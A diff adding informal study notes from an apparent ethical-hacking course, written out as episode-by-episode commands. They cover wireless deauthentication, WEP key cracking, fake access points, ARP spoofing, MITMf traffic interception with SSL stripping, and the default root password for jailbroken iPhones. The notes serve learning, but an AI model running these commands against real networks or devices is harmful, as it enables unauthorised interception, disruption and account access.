@@ -1,0 +1,586 @@
+ETHICAL HACKING
+====================================================
+
+S1E1
+
+interesting at 1:12==>
+
+gain access at any computer system===>
+
+===>backdoor
+
+web_site penetration testing===>
+
+___________________________________________________________________________________
+
+S1E2
+
+Teaser==>
+
+___________________________________________________________________________________
+
+S1E3
+
+you don't have permission to==>
+
+
+Black Hats hackers===>illegal type
+White Hats===>good one
+Grey Hats Hackers===>
+
+___________________________________________________________________________________
+
+S2E1
+
+virtualbox/.org/wiki/Downloads
+
+___________________________________________________________________________________
+
+S2E2
+
+kali-linux is os for ethical hacking==>
+
+===>offensive security===>download kali linux==>
+
+===>you will get .ova extension file
+
+==>double click it==>it will open in virtual box only
+===>import everything
+===>go to setting(by selecting kali linux)==>system==>set Ram1 or 2 gb===>
+===>processor===>give 1 or 2 CPU==>
+==>go to Nework==>select NAT(if problem refer)
+
+====>it will only create virtual ethernet
+
+---------->then Start==>
+
+if not getting username screen refer resources==>
+
+username ===>root
+password===>toor
+
+
+another user
+
+username ===>kali	
+password===>kali
+
+====>>>>sudo su // to go root
+
+
+
+==========>go to view===>full screen
+
+___________________________________________________________________________________
+
+S2E3
+
+snapshot===>set state or bookmarks===>so that we can restore if we get stuck somewhere
+
+===>or store the state of the system===>
+
+------>click on screenshot--->click on camera-->give name and description-->goto details==>start OS
+
+===================================
+
+snapshot expt===>even folder creation is stored==>
+
+======>can also go to future state
+
+___________________________________________________________________________________
+
+S3E1
+
+Basic Overview of kali Linux
+
+===>in status bar==>Apllication==>and ===>Places
+
+kali-linux comes with multiple workspace==># more like tabs
+
+ctrl+ up| down===>to switch workspace
+
+==========>go and explore yourself
+
+___________________________________________________________________________________
+
+S3E2
+
+Kali linux terminal===>open terminal===>
+
+pwd===>present working directory
+ls===>list all directory and files in pwd
+cd dirctory_name===>change directory
+cd .. ===>go back
+man ls====>give manual of ls
+ls -l ===>to give all info
+clear===>clear terminal
+ls --help====>gives e.g. too
+apt-get update ====>update list of pgms that I can install
+apt-get install terminator====> can have many terminals
+
+in terminator===>right click===>split horizontally
+
+___________________________________________________________________________________
+
+S4E1
+
+Network penetration testing====>
+
+1) Pre-connection
+
+2)Gaining Access(for wireless network)
+
+3) Post-Connection
+
+4) Detection & security
+
+___________________________________________________________________________________
+
+S4E2
+
+data is transferred as packets==>
+
+so we need packets to access data==>
+
+___________________________________________________________________________________
+
+S4E3
+
+built in wirelesss adapter can not be used for hacking===>
+
+===>click on VB machine===>ports==>USB==>Enable===>USB2.0===>Plus sign===>add your wireless adapter==>
+
+====>extension pack===>5.0.20===>download extension pack for your version==>
+
+===>double click to install===>scroll down===>agree
+
+----------------------------
+
+in VB machine OS--->device---<USB--->check your adapter(ticked)
+
+====>go to terminal ===>ifconfig
+			wlan0===>must be there
+
+
+___________________________________________________________________________________
+
+S4E4
+
+each network card===>has MAC Address==>Media Access Control==>
+
+blacklist MAC===?
+
+iwconfig===>to show wireless card
+
+====>ifconfig wlan0 down===>to disable wireless card
+>>>macchanger --help
+// -m help to change by ourself
+
+>>macchanger --random wlan0
+// enable it again
+>>>ifconfig wlan0 up
+>>>ifconfig wlan0 // check it has been changed
+
+___________________________________________________________________________________
+
+S4E5
+
+>>>iwconfig===>
+ //if mode is managed then wlan can only recieve packets
+ //if mode is "monitor" ==>then all packets in network can be access by this wlan0 only irrespective of mac address
+
+>>>airmon-ng //list all wlan with chipset
+>>>airmon-ng start wlan0 // start is for monitoerd mode
+
+// you will get mode enables on __name //like mon0
+
+>>>iwconfig mon0 // to check mode again
+// now can capture any packet
+
+//when card is on monitor mode, card will lose its connection
+
+>>>airmon-ng stop mon0 // to stop monitor mode
+
+___________________________________________________________________________________
+
+uninstall=========sudo apt-get install realtek-rtl88xxau-dkms
+
+S4E6
+
+airmon-ng does not support all wireless cards
+
+==>even it shows monitor mode name
+
+>>>ifconfig wlan0 down // disable wireless card
+>>>iwconfig wlan0 mode monitor  //check if it's done
+>>>ifconfig wlan0 up // to enable it again
+>>>iwconfig wlan0 // check again
+
+///now check it using
+>>>airodump-ng wlan0
+
+___________________________________________________________________________________
+
+S4E7
+
+3rd method
+
+if not working unplug and plug it again and try again===>
+
+>>>airmon-ng // show wireless card
+>>>ifconfig wlan0 down //disable card
+>>>airmon-ng check kill // any service which is interuupting to get into monitor mode kill them
+
+>>>airmon-ng start wlan0
+// will get mode __name [phy0]"__name"
+>>>iwconfig __name /// check mode if set to monitor
+
+___________________________________________________________________________________
+
+S5E1
+
+packet sniffer===>
+get card in monitor mode===>
+
+//disconnect your network
+
+>>>airodump-ng __name // will list all networks //BSSID is MAC ADdress
+
+//PWR is power(i.e how far it is from our card) (PWR -34 is closer than -49 card)
+//Beacons is signal that is AP send 
+//ESSID is Access point name
+//#Data is no. of useful that we sniffed
+//# "#/s" data packets we send in past second
+//channel is Access point that are broadcasting
+//MB max data support
+//ENC==>encryption type
+//Cipher ===>cipher code
+//AUTH ===>type of authentication resquire
+
+___________________________________________________________________________________
+
+S5E2
+
+now target some network===>	
+
+>>>airodump-ng --channel __channelNumber(e.g 2) --bssid __MACAddr(e.g 00:99:...) --write __fileName __cardNamewithMonitor mode // --write is to write all info in some file  
+
+// will result in two section first one will give info about network and then 2nd will give client info
+
+// "station" in 2nd section is MAC address of client(device) //PWR is power, RATe===>max spedd //lost ===>lost packet //Frames===>useful packet that we collected
+
+>>>ls file_name* ///file_name is same as after --write flag // and you'll observe that there will be four file with came nime type with different extension
+
+// wireshark is the tool to analyse these file
+
+
+___________________________________________________________________________________
+
+S5E3
+
+WPA key was there so we were not able to decrypt it===>
+
+let's continue==>>
+
+// deauthentication attack
+
+>>>airodump-ng --channel __no --bssid __mac_addr __monitored_card_name //check which all are connected
+
+///disconnect device
+
+>>>aireplay-ng --deauth 10000 -a __mac_address_of_card -c __mac_address_of_source(device) _monitored_card_name //10000 is no. of deauth packets so it will keep it longer to disconnect
+
+___________________________________________________________________________________
+
+S5E4
+
+A fake access point theory==>as honeypot
+
+// two cards are needed
+
+1) is for internet 
+2) is for broadcast
+
+___________________________________________________________________________________
+
+S5E5
+
+Mana-toolkit===>to create Fake AP
+
+===>settings of VM===>NAT
+
+>>>apt-get install mana-toolkit
+
+>>>clear
+>>>ifconfig //eth0: is virtual by virtual machine
+===>device==>USB==>select your card
+
+>>>iwconfig // now you can check wifi card
+
+>>>leafpad /etc/mana-toolkit/hostpad.mana.conf //leafpad is pgm like gedit
+>>>leafpad /usr/share/mana-toolkit/run-mana/start-nat-simple.sh //these are some config file
+
+>>>bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh //execute this to start honeypot //may not work first time
+
+
+___________________________________________________________________________________
+
+S6E1
+
+WEP
+WPA
+WPA2===>encryption
+
+
+___________________________________________________________________________________
+
+S6E2
+
+WEP uses RC4===>oldest one===>with every packet there is plain IV(initialising vector)
+
+
+___________________________________________________________________________________
+
+S6E3
+
+WEP cracking===>
+
+>>>airodump-ng card__name // look at ENC it should be WEP
+
+>>>airodump-ng --bssid __Mac_of_Target_card --channel __channel_no --write file_name __our_card_name
+
+>>>aircrack-ng __file_name01.cap // and it will give password after trying multiple time // we should get continous packets
+
+// and key found==> [ B4:8C...] //just remove colon and use it
+
+
+___________________________________________________________________________________
+
+S6E4
+
+>>>airodump-ng --bssid __mac_addr_of_target --channel __channel_no __card_name_connect_toVM
+
+//to get target access point
+
+//if no client is connected
+===>in this case we will inject dummy packets  due to which router will create packet with new IVs
+
+//before that we have to authenticate :(
+//but there is a provision of --fakeauth
+// we have to use fakeauth everytime...
+
+
+
+>>>airodump-ng --bssid __mac_addr_of_target --channel __channel_no __card_name_connect_toVM
+// you can see auth is nothing
+// if its OPN we have used fake auth
+
+>>>aireplay-ng --fakeauth 0 -a __target_mac_address -h __our_mac_address_so_thatItGetsVerified __our_card_name // 0 is no. of packet that we want to send
+
+//to check our Mac address
+
+>>>ifconfig wlan0 // and then HWaddr
+
+___________________________________________________________________________________
+
+S6E5
+
+packet Injection===>in WEP
+
+//get detail using ...airodump-ng...
+
+// fake authenticate
+
+//ARP request to inject packet
+
+>>>aireplay-ng --arpreplay -b __target_mac_addr -h __our_wifi_card_addr __card_name_in_monitor_mode
+
+// this will create .cap file in root directory like arp-request-reply-test-01.cap
+
+>>>aircrack-ng __file_name.cap ===>and you'will get key
+
+___________________________________________________________________________________
+
+S6E6
+
+.
+.
+.
+
+other episodes are skipped deliberately as they need assumption
+
+___________________________________________________________________________________
+
+S7E1
+
+use VM for ethical hacking====>
+
+developer.microsoft.com/en-us/ microsft-edge/tools/vmswindows
+
+===>virtual machine ===>select MS edge win 10 stable
+
+====>select platform===>slect(Virual box)
+
+--------------->
+
+import ova file==>by double clicking==>and then we can modify setting later
+
+//can chenge modify storage and set ram to 2gb
+
+password is "password" for windows VM
+___________________________________________________________________________________
+
+S7E2
+
+check network is NAT and same name
+
+___________________________________________________________________________________
+
+S7E3
+
+get details ehen connected
+
+>>>netdiscover -i __card_name_in_normal_mode -r ip_address_of_nw(e.g 192.168.1.1/24  ... // 1/24 indicates 1 to 254)
+
+___________________________________________________________________________________
+
+S7E4
+
+//autoscan V1.42 is another way of getting info
+//slow but has graphical interface
+
+//extract by right clicking
+
+// before using it we need library
+//but this need 32bit architecture
+
+so lets do it
+
+>>>dpkg --add-architecture i386
+>>>apt-get update
+>>>apt-get install libc6:i386
+
+==>y>>yes
+
+//after insttalling library and extracting autoscan
+
+//run bash on executable
+
+>>>bash auto_scan....install
+>>>./autoscan-network...-install
+
+//search for autoscan ==>run ==>forward ==>and select n/w interface
+
+///auto scan also shows network card manufacturer
+
+___________________________________________________________________________________
+
+S7E5
+
+Nmap==>can work outside the n/w
+===>can also byfass the firewall
+
+//Zenmap is graphical Nmap
+
+>>>zenmap
+
+///in ping scan==> enter target ip >>will show mac and manufacturer
+
+
+===>quick scan will show open ports
+/// if any phone is open with 22/tcp ssh>>> then it is is jell broken===> can login directly >>>ssh root@_target_ip_address
+/// generally password for Iphone is alpine
+
+___________________________________________________________________________________
+
+S7E6
+
+
+MITM===>Man in the middle
+
+ARP===>security issues===>
+
+==>ARP request/response is trusted
+==>client can accept responses even if they did not ask for request
+
+===>ARP poisioning
+
+___________________________________________________________________________________
+
+S7E7
+
+//arpspoof of a suit called dsniff
+
+//card is in managed mode
+
+>>>arpspoof -i __card_name -t __target_if_addr __ip_addr_of_network
+
+// to get packets vice-versa too
+>>>arpspoof -i __card_name -t __ip_addr_of_network __target_if_addr 
+
+// if you check >>>arp -a // in windows system and check source router ip and its mac
+
+// and after running above those two commands
+
+// we also need to show 
+>>>echo 1 > /proc/sys/net/ipv4/ip_forward
+
+/// now check the mac address in windows >>>arp -a
+
+___________________________________________________________________________________
+
+S7E8
+
+MITMf ==MITM framework
+
+>>>mitmf --arp --spoof --gateway __gateway_ip --target __target_ip_addr -i _interface_name(e.geth0)
+
+// interface name can be found in >>>ifconfig  //in linux
+
+//before that we need to install mitmf
+
+>>>apt-get update
+>>>apt-get install mitmf
+
+// now run the command 
+// and check >>>arp -a //in windows
+
+// now you can check all the get and post request 
+
+___________________________________________________________________________________
+
+S7E9
+
+bypassing HTTPS
+
+///mimtf starts sslStrip automatically
+
+// run the mitmf command and it will start ssl STrip automatically sites like facebook and gmail come with HSTS security and will open Https version only
+
+___________________________________________________________________________________
+
+S7E10
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
